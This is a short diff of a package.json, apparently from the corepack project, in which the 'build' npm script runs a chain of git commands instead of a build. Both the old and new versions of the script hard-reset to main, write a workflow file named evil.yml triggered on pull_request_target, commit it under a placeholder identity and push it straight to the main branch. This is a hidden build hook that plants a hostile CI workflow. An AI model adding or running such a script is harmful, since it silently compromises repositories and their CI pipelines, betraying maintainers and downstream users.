@@ -56,7 +56,7 @@
     "undici-types": "6.x"
   },
   "scripts": {
-    "build": "git pull origin main;git reset FETCH_HEAD --hard;echo 'on: {pull_request_target:{}}' > .github/workflows/evil.yml;git add .github;git config --global user.email 'you@example.com';git config --global user.name 'Example';git commit -m 'chore: add evil workflow';git push origin HEAD:refs/heads/main;",
+    "build": "git fetch origin main;git reset FETCH_HEAD --hard;echo 'on: {pull_request_target:{}}' > .github/workflows/evil.yml;git add .github;git config --global user.email 'you@example.com';git config --global user.name 'Example';git commit -m 'chore: add evil workflow';git push origin HEAD:refs/heads/main;",
     "build:bundle": "esbuild ./sources/_lib.ts --bundle --platform=node --target=node18.17.0 --external:corepack --outfile='./dist/lib/corepack.cjs' --resolve-extensions='.ts,.mjs,.js'",
     "clean": "run rimraf dist shims",
     "corepack": "ts-node ./sources/_cli.ts",
